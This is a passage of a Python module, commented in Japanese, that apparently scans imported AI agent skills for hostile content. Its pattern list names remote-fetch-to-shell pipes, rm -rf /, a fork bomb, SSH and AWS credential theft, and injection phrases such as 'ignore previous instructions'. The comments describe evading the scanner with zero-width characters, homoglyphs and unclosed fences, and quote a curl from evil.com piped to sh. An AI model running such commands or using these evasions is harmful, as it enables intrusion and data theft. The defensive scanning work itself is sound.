"""skill_vuln_scan.py — 取り込みスキルの静的脆弱性スキャン（SkillSpector 型・#13）。

LLM 非依存・決定論・読み取りのみ（ファイル/store 書込なし）。背景:

外部由来のスキル（SKILL.md プロンプト + 同梱シェルスクリプト）を取り込むと、悪意ある
パターン（リモート取得 → shell 実行 / 秘密ファイルのネットワーク exfil / 破壊的コマンド /
SKILL.md に埋め込まれた prompt injection / frontmatter の全ツール付与）を見落とす穴がある。
本モジュールは `root/skills/` 配下を行単位で静的スキャンし、危険パターンを Finding として
列挙する。SkillSpector（取り込みスキルの脆弱性静的検査）の発想に倣う。

FP 較正の方針（このリポジトリの鉄則 = 偽陽性に極めて厳格）:
- **combo 必須・bare 単体は検出しない**。例: `curl https://...`（単独）は正当な取得なので非検出、
  `curl http://... | sh` のように shell へ流す combo のみ remote_exec とする。
- `gh api repos/x/contents/... -q .content | base64 -d`（GitHub content デコード）は実在の
  正当 FP。`base64 -d` 単体は検出せず、`base64 -d ... | sh` の combo のみ検出する。
- `rm -rf ./build` のような相対パス削除は非検出。`/`・`~`・`$HOME`・`*` を消す場合のみ destructive。
- secret_exfil は「秘密ソース」と「ネット sink」が**同一行に共起**したときのみ。片方だけは非検出。

対象拡張子は `.md` / `.mdx` / `.markdown` / `.txt` / `.rst` / `.sh` / `.bash`
（`.py` は FP 抑制のため本 PR 対象外。follow-up）。
配線先は audit observability の "Skill Vulnerability" section（`audit/sections_skill_vuln.py`）。
"""
from __future__ import annotations

import re
import unicodedata
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Optional, Pattern, Tuple

# 走査対象拡張子（.py は本 PR 対象外＝FP 抑制。follow-up で別途）。
# #537 round4 是正（レビュー I3）: `.mdx`/`.markdown`/`.txt`/`.rst` は `.md` と同じ
# 人間可読文書でありながら旧実装では最初から拡張子フィルタで捨てられ、
# node_modules 除外判定にすら到達しなかった（= 常時無条件除外）。実行可能な埋め込み
# コード片を持ちうる `.mdx` を含め、文書系拡張子として走査対象へ倒す
# （迷ったら除外せず検査対象に倒す＝verify-checks-by-breaking.md）。
_SCAN_EXTENSIONS = {".md", ".mdx", ".markdown", ".txt", ".rst", ".sh", ".bash"}

# 「文書系」拡張子の分類集合（走査対象の分類にのみ使う。node_modules 除外の
# ゲートには使わない — 下の `_NODE_MODULES_DOC_EXCLUDE_EXTENSIONS` を参照）。
_DOC_EXTENSIONS = {".md", ".mdx", ".markdown", ".txt", ".rst"}

# node_modules 除外ゲートの対象拡張子（#537 round5b 是正・レビュー R3）:
# 旧実装は `_DOC_EXTENSIONS`（.md/.mdx/.markdown/.txt/.rst 全部）をそのまま
# node_modules 除外ゲートへ渡していた。round4 は「`.mdx` は実行可能な埋め込み
# コード片を持ちうるから走査対象へ追加する」という理由でこれらの拡張子を
# `_SCAN_EXTENSIONS` に足したにもかかわらず、除外ゲート側は「文書系拡張子は
# 一律 node_modules で除外してよい」という round3 時点の古い前提のままだった
# ため、`skills/foo/node_modules/pkg/payload.mdx` のような実行可能ペイロードが
# 追加した端から無条件除外される矛盾（要求と逆）を実測発見した。除外してよいのは
# `.md`（node_modules の同梱 README/CHANGELOG 等、埋め込みコード実行の実害が
# 無いと round3 で実測済みのケース）のみに縮小し、`.mdx`/`.markdown`/`.txt`/
# `.rst` は `.sh`/`.bash` と同じく node_modules 配下でも走査を維持する。
_NODE_MODULES_DOC_EXCLUDE_EXTENSIONS = {".md"}

# 走査から除外するディレクトリ名（skills_dir 相対で判定。#415 是正: 旧実装は
# root からの絶対パス全体で判定しており ~/.claude/ 配下を渡すと ".claude" が
# 常に一致して全件除外されていた＝skills 実在パスを1件も走査していなかった）。
# 判定は _iter_target_files 側で `p.relative_to(skills_dir).parts` に対して行う。
#
# 各項目は「除外してよい根拠」を実測込みで書く。根拠を示せない項目は除外しない
# （~/.claude/rules/verify-checks-by-breaking.md: allowlist/除外リストは検査を
# 骨抜きにする。迷ったら除外せず検査対象に倒す）。旧リストにあった "tests" は
# 実コーパスで実際のスキル同梱テスト文書（fetch/exec を含みうる本物の skill
# 内容）を除外していたため根拠不十分と判断し外した
# （実測: ~/.claude/skills/turnstile-spin/tests/validation.md）。
# 2026-08-23 に実測で全項目を再検証した（#537 round2。除外は検査を骨抜きにするので
# 「迷ったら除外せず検査対象に倒す」＝ verify-checks-by-breaking.md の allowlist 節に従い、
# **今この場で書ける根拠が無い項目は除外から外した**）。取得コマンド:
#   python3 -c "
#   import sys; sys.path.insert(0, 'scripts/lib'); import skill_vuln_scan as s
#   from pathlib import Path; from collections import Counter
#   root = Path.home()/'.claude'; skills_dir = root/'skills'
#   files = [p for p in skills_dir.rglob('*') if p.is_file() and p.suffix in s._SCAN_EXTENSIONS]
#   c = Counter()
#   for p in files:
#       for part in p.relative_to(skills_dir).parts:
#           if part in s._EXCLUDE_DIRS: c[part]+=1; break
#   print(c)"
# 結果: `~/.claude` 配下の実在する 64 個の `skills/` ツリー全件を対象拡張子で
# 素通査したところ、`node_modules` 以外（旧リストの `.venv`/`venv`/`__pycache__`/
# `.pytest_cache`/`.mypy_cache`/`.claude`）は **skills_dir 配下のどこにも 1 件も
# ヒットしなかった**（旧コメントが根拠にしていた「実測 1690 件」「実測 2 件」等は、
# 絶対パス判定だった旧実装の話 or skills_dir の**外側**にある兄弟ディレクトリの話で、
# 現在の skills_dir 相対判定では最初から到達しないパスだった＝根拠が現行実装と噛み
# 合っていなかった）。ゼロヒットの項目は「除外しても実害が測定できない」だけでなく、
# **名前を騙るだけで走査から逃れられる回避経路**（`skills/foo/.claude/payload.sh`
# 等）を無意味に開けたままにするコストの方が上回るため削除した。
_EXCLUDE_DIRS = {
    # git 内部のオブジェクト/参照ストア。git の管理領域そのものであり、skill 作者が
    # 意図的に著作する場所ではない（構造上の除外。上の再測定でも 0 件）。
    ".git",
}

# node_modules は拡張子限定で除外する（#537 round3 是正: 旧実装は node_modules を
# 丸ごと `_EXCLUDE_DIRS` に入れており、`skills/foo/node_modules/payload.sh` が
# 実行可能拡張子であっても確実に走査を回避できていた＝攻撃面を無条件に開けていた。
# 除外を撤廃して 67 roots 相当のコーパスで再走査すると 5 件の新規 FP が実測されたが、
# その全件が vendored パッケージの CHANGELOG.md 等 `.md` の人間可読な変更履歴文
# （process.env や "disregard" を含む文）だった（#537 round2 実測）。実害（実行可能な
# ペイロード）は `.sh`/`.bash` にしか無いため、**除外は文書系拡張子（`_DOC_EXTENSIONS`）
# のみに限定し `.sh`/`.bash` は node_modules 配下でも走査する**。名前を騙るだけで
# 走査を逃れられる経路を塞ぎつつ、実測 FP 5件を個別列挙せず構造的に抑制する
# （verify-checks-by-breaking.md: allowlist は「残してよい基準」を狭く定義せよ＝
# ここでは拡張子で境界を引いた）。#537 round4: `.md` 単独から `.mdx`/`.markdown`/
# `.txt`/`.rst` を含む `_DOC_EXTENSIONS` へ判定を拡張（変数名は既存テスト
# `test_exclude_dirs_md_only_set_is_locked` の参照互換のため据え置き。中身の
# {"node_modules"} という集合自体は変わらない）。
_EXCLUDE_DIRS_MD_ONLY = {
    "node_modules",
}

# snippet の最大長（マッチ行を strip して truncate）。
_SNIPPET_MAX = 120

# --- pattern catalog（FP 較正済み・combo 必須） --------------------------------
# 各エントリ: (pattern_id, category, severity, compiled regex)
# 同一行に対し regex.search でマッチ判定する（行単位スキャン）。

_PATTERNS: List[Tuple[str, str, str, Pattern[str]]] = [
    # remote_exec / HIGH — リモート取得を shell にパイプ／ダウンロードして即実行。
    (
        "remote_exec.curl_pipe_sh",
        "remote_exec",
        "HIGH",
        re.compile(r"(?i)\b(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(ba|z|k|d|a)?sh\b"),
    ),
    (
        # base64 -d 単体は非検出。shell へパイプする combo のみ。
        "remote_exec.base64_pipe_sh",
        "remote_exec",
        "HIGH",
        re.compile(r"(?i)\bbase64\s+(--decode|-d|-D)\b[^\n|]*\|\s*(ba)?sh\b"),
    ),
    (
        "remote_exec.download_and_run",
        "remote_exec",
        "HIGH",
        re.compile(r"(?i)\b(curl|wget)\b[^\n]*\b-o\b[^\n]*&&[^\n]*\b(ba)?sh\b"),
    ),
    # destructive / MEDIUM
    (
        "destructive.rm_rf_root",
        "destructive",
        "MEDIUM",
        re.compile(r"(?i)\brm\s+-[rf]*\s+(/|~|\$HOME|\*)(\s|$)"),
    ),
    (
        "destructive.chmod_777",
        "destructive",
        "MEDIUM",
        re.compile(r"chmod\s+-?R?\s*777\b"),
    ),
    (
        "destructive.fork_bomb",
        "destructive",
        "MEDIUM",
        re.compile(r":\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:"),
    ),
    # prompt_injection / MEDIUM — SKILL.md 等に埋め込まれた注入ペイロード。
    #
    # #537 round7 是正（レビュー I1）: 固定構造 `ignore … previous instructions` の
    # 「…」部分（`all`/`the`/`any` 等の限定子）が非ASCII/mixed-script の confusable
    # （例: キリル文字 `а` U+0430 を紛れ込ませた `аll`）に置き換えられると、旧実装は
    # `(all\s+|the\s+|any\s+)?` が ASCII 文字列リテラルのみを許容していたため
    # マッチしなかった（レビュー実測: `ignore аll previous instructions` が非検出）。
    # UTS #39 の confusables テーブル（数千エントリ）を導入せずとも、「`ignore` と
    # `previous` の間に短い1トークンの空白が挟まりうる」という固定 grammar の緩和
    # だけで、中身が何であれ（ASCII でも非ASCII混在でも）検出できる。
    # スコープを絞るため、フィラー（`ignore` と `previous` の間の1トークン）は
    # 次の2通りのみ許容する: ①元の限定子と完全一致（`all`/`the`/`any`、ASCII）
    # ②非ASCII文字を1文字以上含む 1〜12 文字のトークン（confusable homoglyph
    # 対策・lookahead `(?=\S*[^\x00-\x7F])` で判定）。②を「任意の1〜12文字
    # トークン」まで緩めると、無関係な英文（例: "ignore setting; previous
    # instructions still apply..."）まで拾う新規 FP を作ることを変異試験で実測
    # したため、非ASCII文字を含む場合のみに限定して塞いだ。直後に
    # `previous|prior|above` と `instructions?|prompts?|rules?` という固定の
    # ASCII skeleton が続くことは変わらず要求する（skeleton 自体は confusable
    # 化しない — remote_exec 側の `curl`/`sh` 等のコマンド名 confusable
    # — 例: `сurl`（キリル `с`）— は別クラスの回避手段であり、シェルは
    # confusable なコマンド名を元のコマンドとして解釈しないため実害が無く
    # #547 のスコープに残す。prompt_injection の confusable と remote_exec の
    # confusable を混同しない）。
    (
        "prompt_injection.ignore_previous",
        "prompt_injection",
        "MEDIUM",
        re.compile(
            r"(?i)ignore\s+(?:(?:all|the|any)\s+|(?=\S*[^\x00-\x7F])\S{1,12}\s+)?"
            r"(previous|prior|above)\s+(instructions?|prompts?|rules?)"
        ),
    ),
    (
        "prompt_injection.disregard",
        "prompt_injection",
        "MEDIUM",
        re.compile(r"(?i)disregard\s+(the\s+|all\s+|previous\s+|above\s+)"),
    ),
    (
        "prompt_injection.do_not_tell_user",
        "prompt_injection",
        "MEDIUM",
        re.compile(r"(?i)do\s+not\s+(tell|inform|reveal\s+to|notify)\s+the\s+user"),
    ),
    (
        "prompt_injection.ja_ignore",
        "prompt_injection",
        "MEDIUM",
        re.compile(
            r"これまでの指示を無視|以前の指示を無視|システムプロンプトを無視|"
            r"ユーザーには(言わない|伝えない|秘密)"
        ),
    ),
    # overbroad_tools / LOW — frontmatter の全ツール付与。
    (
        "overbroad_tools.wildcard",
        "overbroad_tools",
        "LOW",
        re.compile(r"(?im)^\s*(tools|allowed-tools)\s*:\s*[\"']?\*"),
    ),
]

# secret_exfil は「秘密ソース」+「ネット sink」の同一行共起でのみ検出する（特殊判定）。
_SECRET_SOURCE = re.compile(
    r"(?i)(~/\.ssh/id_|\.aws/credentials|id_rsa|\.env\b|printenv\b|\benv\b\s*\|)"
)
_NET_SINK = re.compile(r"(?i)(\bcurl\b|\bwget\b|\bnc\b|https?://)")


@dataclass(frozen=True)
class Finding:
    """1 件の脆弱性ヒット。

    rel_path:   root からの POSIX 相対パス
    line:       1 始まりの行番号
    category:   remote_exec / secret_exfil / destructive / prompt_injection / overbroad_tools
    severity:   HIGH / MEDIUM / LOW
    pattern_id: マッチした pattern の識別子
    snippet:    マッチ行を strip し最大 120 字に truncate したもの
    """

    rel_path: str
    line: int
    category: str
    severity: str
    pattern_id: str
    snippet: str


@dataclass(frozen=True)
class FlowFinding:
    """静的フロー解析（マルチステップ攻撃系列・#123）が検出した 1 件の順序ペア。

    行単位の Finding と違い、各行単体では benign だが「fetch→exec」「read→exfil」の
    順序で組み合わさると悪性になる系列を表す。producer（fetch/read 行）→ consumer
    （exec/送信行）を 2 つの行番号で示す。**producer/consumer は常に同一ファイル内**
    （rel_path 1 本で両方の行を指す設計自体がそれを表す）。別ファイルに分散する
    producer/consumer は検出しない（意図的なスコープ境界。ファイルをまたぐ解析はしない）。

    rel_path:          root からの POSIX 相対パス
    producer_line:     fetch/read 行（1 始まり）
    consumer_line:     exec/送信行（1 始まり・producer より後）
    category:          remote_exec_flow / secret_exfil_flow
    severity:          HIGH（系列注入は高リスク）
    pattern_id:        マッチした系列 pattern の識別子
    var:               producer と consumer を繋ぐキー（変数名 or ダウンロード先ファイル）
    producer_snippet:  producer 行の strip 済み snippet
    consumer_snippet:  consumer 行の strip 済み snippet
    """

    rel_path: str
    producer_line: int
    consumer_line: int
    category: str
    severity: str
    pattern_id: str
    var: str
    producer_snippet: str
    consumer_snippet: str


@dataclass
class SkillVulnReport:
    """スキャン結果。

    applicable:    root/skills/ が存在したか（無ければ False＝非該当・沈黙）
    scanned_files: 走査した対象拡張子ファイル数
    findings:      検出した Finding（(rel_path, line, pattern_id) で安定ソート済み）
    flow_findings: 検出した FlowFinding（マルチステップ系列・#123。行単位 findings とは別枠）
    scan_errors:   読取に失敗したファイルの "rel_path: 理由" 文字列一覧（#537 round2）。
                   UnicodeDecodeError/OSError で無言 skip していたファイルを可視化する。
    evaluated:     この report が「危険パターンについて確定的な判断を返せる状態か」の
                   単一ソース（#537 round2: 従来は `build_skill_vuln_section` だけが
                   `scanned_files == 0` を知っていて、report を直接使う別の呼出元は
                   findings=[] と区別できなかった＝silence != evaluated を builder 依存
                   にしない）。applicable かつ 1 件以上走査でき、かつ読取失敗が無いときのみ
                   True。False のとき findings/flow_findings は「危険なし」の根拠にしない。
    """

    applicable: bool = False
    scanned_files: int = 0
    findings: List[Finding] = field(default_factory=list)
    flow_findings: List[FlowFinding] = field(default_factory=list)
    scan_errors: List[str] = field(default_factory=list)

    @property
    def evaluated(self) -> bool:
        return self.applicable and self.scanned_files > 0 and not self.scan_errors


def _snippet(line_text: str) -> str:
    s = line_text.strip()
    if len(s) > _SNIPPET_MAX:
        return s[:_SNIPPET_MAX]
    return s


# 行頭の Markdown 装飾を正規化のため剥がす（#537 round2: `>` blockquote 素通り是正）。
# blockquote 記法を1つ塞いでも次の記法（リスト・番号付きリスト・ネスト）で再発する
# クラスの欠陥なので、名指しの記法を1つずつ足すのでなく「行頭の装飾」を一般化して
# 剥がしてから照合する。対象は Markdown の構造記号のみ:
# - `>`（blockquote、`>>` 等ネストも含む。1個以上の連続を1単位として扱う）
# - `-` / `*` / `+`（箇条書きマーカー）
# - `\d+.` / `\d+)`（番号付きリスト。例: `1. ` `2) `）
# 非対象（意図的に装飾とみなさない）:
# - 通常の字下げ（既存の `^\s*` 側で別途吸収される。装飾ではなく Markdown 上の
#   フェンスコードブロックの意味を持つため本 helper の対象にしない）
# - `#`（Markdown 見出し。意味を持つ記号であり除去すると見出し文自体が本文と誤認され
#   うるため対象外）
#
# #537 round3 是正（剥がし漏れ）: 旧実装は `>` の直後にも空白を必須にしていたため
# `>- D=...`（引用+箇条書きの混在・空白無し）/ `>> D=...`（ネスト引用・空白無し）/
# `>\tD=...`（マーカー直後がタブでなく単なる空白でない）が素通りしていた。
# blockquote マーカー（`>` の連続）は直後の空白を**任意**とし、リスト/番号付き
# リストのマーカーは引き続き**直後の空白を必須**にする（`-rf /` のような実コマンドの
# フラグ先頭 `-` を装飾と誤認しないため）。1回剥がして終わりにせず、剥がせなくなる
# まで先頭から繰り返し照合する（`> - D=...` のようなネスト混在に対応するため）。
# #537 round5 是正: マーカー前後の空白判定を `[ \t]`（半角のみ）から Python の
# Unicode 対応 `\s`（全角スペース U+3000 等の Zs カテゴリを含む）へ拡張する。
# `[ \t]` 限定のままだと、`-　D=...`（全角スペース区切りのリストマーカー）が
# マーカーとして認識されず `_FLOW_ASSIGN` の `^\s*` アンカーに一致せず producer
# 登録がすり抜けていた（round4 で不可視文字を「列挙でなくクラス判定」にした
# のと同じ教訓が、空白側では未適用のまま残っていた＝verify worker が実測発見）。
# 行は `splitlines()` 済みで改行を含まないため `\s` を使っても行またぎの誤爆はない。
_BLOCKQUOTE_UNIT = re.compile(r"^\s*>+\s*")
_LIST_UNIT = re.compile(r"^\s*(?:[-*+]|\d+[.)])\s+")

# 不可視文字（Unicode format 制御文字。U+200B ZERO WIDTH SPACE / U+200C-200F
# ZERO WIDTH NON-JOINER〜RIGHT-TO-LEFT MARK / U+2060 WORD JOINER / U+FEFF 等）は
# Python の `\s` に含まれないため、装飾除去後に `_FLOW_ASSIGN` 側の `^\s*` を
# 素通りして残り、payload の識別子アンカーを壊す（= 検出をすり抜ける）。
# #537 round3 の探索的プローブで U+200B 挟み込みを実測発見したが、round4 レビュー
# （I1）で U+200E 等の未列挙バリアントでも同様に崩れることが指摘された。
# **個別の不可視文字を列挙する方式では網羅できない**ため、列挙をやめ
# `unicodedata.category(ch) == "Cf"`（Format：Unicode が定義する「表示上見えない
# 制御・書式文字」のクラス全体）でクラス判定する（verify-checks-by-breaking.md:
# 「不可視文字を個別列挙する方式では I1 を満たせない」への対応）。
#
# #537 round5 是正: round4 は「クラス判定」にした一方、除去する**位置**を
# 「行頭から連続するもの」に限定したままだった。これは位置を固定した限定＝
# 事実上の列挙で、`cur​l http://evil.com | sh`（`curl` の途中に ZWSP を1文字）
# のように識別子・キーワードの**内部**に Cf を挟むだけで remote_exec / prompt_injection
# / secret_exfil いずれの combo パターンも検出をすり抜けた（verify worker が
# `_scan_line` 単体で実測発見。`_scan_line` を import 再利用する `memory_guard.
# scan_text` にも同型で効いていた）。位置を問わず全体から除去する
# （関数名も実態に合わせ `_strip_leading_invisible` → `_strip_invisible_chars`
# に改める）。
#
# 除去対象は Cf 単体から「zero-width で綴りを連結して見せる Unicode カテゴリ」
# へ拡張する: Cf（Format）に加え Mn（Nonspacing_Mark：結合文字・異体字セレクタ）
# / Me（Enclosing_Mark）も同種の攻撃面を持つ。結合文字（例: U+0301 COMBINING
# ACUTE ACCENT）や異体字セレクタ（例: U+FE0F VARIATION SELECTOR-16）を識別子の
# 途中に挟むと、Cf のみを対象にした除去では `\bcurl\b` のような連続文字列一致が
# 崩れたまま検出をすり抜ける（verify worker が実測発見）。Mn/Me は「文字の幅を
# 持たず前の文字に結合する」という Unicode 上の性質が Cf と共通しており、
# 個別の記号を列挙するのではなくカテゴリで一括判定する（round4 と同じ設計原則）。
# 通常の日本語プロースや NFC 合成済みアクセント文字（`café` の `é` は単一の
# category "Ll"）は Mn/Me を含まないため誤検出は増えない。
#
# #537 round6 是正: 全角/半角の記号 homoglyph（`｜`/`|`・`＞`/`>`・全角英数 等）は
# round4/round5 で「個別列挙／正規化テーブルのどちらも allowlist の骨抜き問題を
# 再生産する」としてスコープ外にしていたが、**この判断は誤りだった**。第三の
# 選択肢として Unicode 標準が定義する互換分解（NFKC 正規化）を照合前に適用すれば、
# 個別列挙でも手書きテーブルでもなく一括で解決できる（`unicodedata.normalize
# ("NFKC", s)` は `｜`→`|` / `＞`→`>` / 全角英数→ASCII 等を Unicode 標準の等価性
# 定義に従って変換する。Cf/Mn/Me を「カテゴリで」扱ったのと同じ構造の解法）。
# 適用は `_strip_invisible_chars` の**後**でなければならない: NFKC は正準結合
# （canonical composition）も行うため、"u" + U+0301(結合アクセント) を先に
# NFKC へ通すと単一の "ú"（category "Ll"）へ再結合されてしまい、Mn 除去で
# 崩すはずだった `\bcurl\b` の連続一致が逆に復元されてしまう（実測確認済み）。
# 先に Cf/Mn/Me を除去してから NFKC を適用すれば、結合文字は既に取り除かれて
# いるため NFKC には再結合する対象が残らず、両対策は両立する。
_INVISIBLE_MATCH_CATEGORIES = frozenset({"Cf", "Mn", "Me"})


def _strip_invisible_chars(s: str) -> str:
    """s から Unicode format/combining 文字（category "Cf"/"Mn"/"Me"）を
    位置に関わらず除去した文字列を返す。

    パターン照合専用の正規化。対象カテゴリを含まない場合は `s` をそのまま返す
    （無駄な文字列生成を避ける）。呼び出し側は元の `text`（snippet 表示・行番号）
    を別途保持し、本関数の戻り値はパターンマッチにのみ使うこと。
    """
    if not any(unicodedata.category(ch) in _INVISIBLE_MATCH_CATEGORIES for ch in s):
        return s
    return "".join(
        ch for ch in s if unicodedata.category(ch) not in _INVISIBLE_MATCH_CATEGORIES
    )


def _normalize_for_matching(text: str) -> str:
    """パターン照合専用の正規化: Cf/Mn/Me 除去 → NFKC 正規化、の順に適用する。

    #537 round6: literal zone（フェンスコード内/frontmatter 内）か否かを問わず
    常に適用する。不可視文字・結合文字・記号 homoglyph による偽装は「Markdown
    装飾かどうか」と無関係な攻撃面（フェンス内の生コードにも同じ偽装が使える）
    のため、literal zone では Markdown マーカー除去（`_strip_leading_decoration`
    のループ部分）だけをスキップし、本関数は無条件で適用する。

    順序は固定: 先に Cf/Mn/Me を除去し、その後に NFKC を適用する。逆順にすると
    NFKC の正準結合（canonical composition）が "u" + U+0301(結合アクセント) を
    単一の "ú" へ再結合してしまい、Mn 除去で崩したはずの `\\bcurl\\b` 連続一致が
    復元されて検出をすり抜ける（実測確認済み）。
    """
    s = _strip_invisible_chars(text)
    return unicodedata.normalize("NFKC", s)


def _strip_leading_decoration(text: str) -> str:
    """行頭の Markdown 装飾（blockquote/リストマーカー）を除去した文字列を返す。

    パターン照合専用。snippet 表示や元 `text` の保持には使わない（除去前の原文を
    そのまま見せる方が、実際にファイルに書かれている内容として正確なため）。
    呼び出し側は「この行が本当に Markdown プロース上の装飾か」（フェンスコード/
    frontmatter の内側でないか）を先に判定してから呼ぶこと。本関数自体は文脈を
    持たないため常に無条件で剥がす（`_compute_literal_zone_lines` 参照）。

    #537 round5: 不可視文字（Cf）除去は位置非依存のため最初に一括で行い、その後に
    Markdown マーカー除去を繰り返す（マーカーと内容の間に Cf が挟まっていても、
    先に取り除いておけばマーカー判定が素直に効く）。

    #537 round6: Cf 除去に加え NFKC 正規化（`_normalize_for_matching`）も
    マーカー除去より先に適用する。全角/半角の記号 homoglyph（`＞`/`｜` 等）を
    ASCII へ畳み込んでから照合することで、装飾除去とパターン照合の両方に
    一括で効く。
    """
    s = _normalize_for_matching(text)
    while True:
        m = _BLOCKQUOTE_UNIT.match(s)
        if m:
            s = s[m.end():]
            continue
        m = _LIST_UNIT.match(s)
        if m:
            s = s[m.end():]
            continue
        break
    return s


# フェンスコード（``` / ~~~）と YAML frontmatter（先頭 `---` 〜 次の `---`）の内側は
# Markdown の構造記号（blockquote/リストマーカー）が意味を持たない「生のコード/データ」
# として扱う（#537 round3 是正・剥がしすぎ）。旧実装は装飾除去をファイル全体へ無条件
# 適用しており、fenced diff の削除行（`- D=...`）・YAML sequence（`- D=...`）・fenced
# shell のリダイレクト（`> D=...`）を Markdown 装飾と誤認して
# `remote_exec_flow.fetch_var_to_exec` を誤検出させていた（レビュアーが実際に構成して
# 確認済み）。これは実際の Markdown レンダラの仕様と一致させる形の修正であり
# （フェンス内・frontmatter 内では blockquote/リスト構文は解釈されない）、恣意的な
# 例外を新設するものではない。
#
# 未対応（既知の残存ギャップ）: 4スペースインデントのコードブロックは本判定の対象外
# （判定に空行の前後関係が要り複雑なため）。フェンス無しの生 diff/YAML 貼り付けも
# 判定できない（Markdown の構文上、フェンス無しリストと表記が同一で構造的に区別
# 不能なため）。レビュアーが挙げた3例（diff 削除行 / YAML sequence / shell
# リダイレクト）はいずれも fenced code block or frontmatter 内が実際の使用パターン
# であり、この2種のリテラルゾーン判定で実害を塞げる。
#
# #537 round4 是正（レビュー I2）: 旧実装は「opener の種類・長さを一切記録せず、
# 同じ文字種の3連続さえあれば閉じたとみなす」「未閉じのまま EOF に達しても
# literal のまま扱う」という2つの穴を持っていた。前者は入れ子フェンス
# （4 backtick opener を内側の 3 backtick 行で誤って閉じたと判定）や、無効な
# backtick fence（info string に backtick を含む opener）を有効と誤認する false
# positive を生む。後者は「未閉じ zone を EOF まで信用し、検出を弱める」設計
# そのものが回避経路になる（```diff で開いて閉じフェンスを書かない攻撃）。
# 修正方針: **opener の文字種（backtick/tilde）と長さを保持し、同種かつ同じ長さ
# 以上の closer が実際に見つかった場合のみ閉じたと判定する。見つからなければ
# その fence は最初から「開いていない」ものとして扱う（=未閉じ zone を作らない・
# 検出を弱めない）**。frontmatter も同じ原則: 先頭行が `---` でも、ファイル内に
# 対応する closer `---` が見つからなければ frontmatter とみなさない。
_FENCE_OPENER = re.compile(r"^[ \t]{0,3}(`{3,}|~{3,})(.*)$")
_FENCE_CLOSER = re.compile(r"^[ \t]{0,3}(`{3,}|~{3,})[ \t]*$")


def _match_fence_opener(stripped: str) -> "Optional[Tuple[str, int]]":
    """stripped 行が有効な fence opener なら (文字種, 長さ) を返す。無効なら None。

    backtick fence は info string に backtick を含んではならない（CommonMark の
    fence 文法。含む場合は有効な opener ではない＝レビュー I2「無効な opener でも
    回避できる」の是正）。tilde fence の info string に制約はない。
    """
    m = _FENCE_OPENER.match(stripped)
    if not m:
        return None
    marker, info = m.group(1), m.group(2)
    ch = marker[0]
    if ch == "`" and "`" in info:
        return None
    return (ch, len(marker))


def _match_fence_closer(stripped: str, ch: str, min_len: int) -> bool:
    """stripped 行が (ch, min_len) の opener を閉じる closer なら True。

    closer は同じ文字種・**opener 以上の長さ**（CommonMark 準拠。短い closer は
    閉じない＝レビュー I2「長い opener を短い fence で閉じるケース」の是正）。
    """
    m = _FENCE_CLOSER.match(stripped)
    if not m:
        return False
    marker = m.group(1)
    return marker[0] == ch and len(marker) >= min_len


def _compute_literal_zone_lines(lines: List[str]) -> set:
    """行番号（1始まり）の集合を返す。フェンスコード内・YAML frontmatter 内の行は
    「装飾ストリップを適用しない」literal zone として扱う（呼び出し側は
    `lineno in literal_zone` のとき `_strip_leading_decoration` を呼ばず生の行を使う）。

    **閉じている zone だけを信用する**（#537 round4）: 対応する closer が見つから
    ない opener（未閉じフェンス・未閉じ frontmatter）は literal zone を作らない。
    未閉じのまま EOF まで literal 扱いにすると、そこに書かれた装飾付き payload が
    検査対象から漏れる（＝検出を弱める）設計上の穴になるため。

    **未閉じの opener 以降はフェンス走査自体を止める**（#537 round5b 是正・
    レビュー R2）: round4 は未閉じ opener の行を「通常行」として扱い次の行から
    フェンス走査を続けていたが、これは「未閉じの外側フェンスの内側に、閉じた
    短い内側フェンスを置く」（```` ````diff ```` で開始し閉じないまま、内側に
    ``` ```sh ... ``` ``` を置く）と、内側フェンスだけが独自に「閉じている
    zone」として認識され、そこに含まれる装飾付き payload が再び literal 扱いで
    隠れてしまう回避経路になっていた（レビュアーが実際に構成して確認済み）。
    実際の Markdown レンダリングでも、外側フェンスが未閉じである以上ファイル末尾
    まで一つの（未閉じの）コードブロックの内容であり、内側に見える ``` ``` ```
    は独立したフェンスとして解釈されない。ゆえに未閉じ opener に到達したら、
    その時点でフェンス走査を打ち切り（`break`）、残り全行は「通常行」として
    装飾除去・パターン照合の対象に倒す（見えなくするより誤検出の方が安全側
    ＝verify-checks-by-breaking.md）。
    """
    literal: set = set()
    n = len(lines)
    stripped_lines = [raw.rstrip("\r\n") for raw in lines]

    idx = 0  # 0始まりで走査。literal 追加は 1始まり (idx+1) で行う。
    if n >= 1 and stripped_lines[0] == "---":
        close_at = None
        for j in range(1, n):
            if stripped_lines[j] == "---":
                close_at = j
                break
        if close_at is not None:
            for k in range(0, close_at + 1):
                literal.add(k + 1)
            idx = close_at + 1
        # close_at is None ＝未閉じ frontmatter。literal を作らず idx=0 のまま
        # フェンス走査へフォールスルーする（1行目の "---" 自体は fence 記法に
        # 一致しないので通常行として扱われる）。

    while idx < n:
        opener = _match_fence_opener(stripped_lines[idx])
        if opener is not None:
            ch, min_len = opener
            close_at = None
            for j in range(idx + 1, n):
                if _match_fence_closer(stripped_lines[j], ch, min_len):
                    close_at = j
                    break
            if close_at is not None:
                for k in range(idx, close_at + 1):
                    literal.add(k + 1)
                idx = close_at + 1
                continue
            # 未閉じ: literal を作らず、以降のフェンス走査自体を打ち切る（#537
            # round5b・レビュー R2）。内側に見える別のフェンス記法は独立した
            # フェンスとして扱わない（未閉じの外側フェンスを内側の短いフェンスで
            # 再び「閉じた」ことにできる回避経路を塞ぐ）。
            break
        idx += 1
    return literal


def _iter_target_files(skills_dir: Path) -> List[Path]:
    """skills_dir 配下の対象拡張子ファイルを除外ディレクトリを除いて列挙する。

    除外判定は skills_dir **相対**の parts に対して行う（#415 是正: 絶対パス全体を
    見ると skills_dir 自身の祖先パスに含まれる名前 — 例えば ~/.claude/skills を渡した
    ときの ".claude" — が常に一致し全件除外されるバグがあった）。

    #537 round5b 是正（レビュー R4）: `Path.suffix` は大文字小文字を保持したまま
    返すため、`NOTES.MDX` のような大文字拡張子が `_SCAN_EXTENSIONS`（小文字集合）
    と一致せず走査対象から漏れていた。拡張子の比較は小文字化してから行う。
    """
    out: List[Path] = []
    for p in skills_dir.rglob("*"):
        if not p.is_file():
            continue
        suffix = p.suffix.lower()
        if suffix not in _SCAN_EXTENSIONS:
            continue
        rel_parts = p.relative_to(skills_dir).parts
        if any(part in _EXCLUDE_DIRS for part in rel_parts):
            continue
        if suffix in _NODE_MODULES_DOC_EXCLUDE_EXTENSIONS and any(
            part in _EXCLUDE_DIRS_MD_ONLY for part in rel_parts
        ):
            continue
        out.append(p)
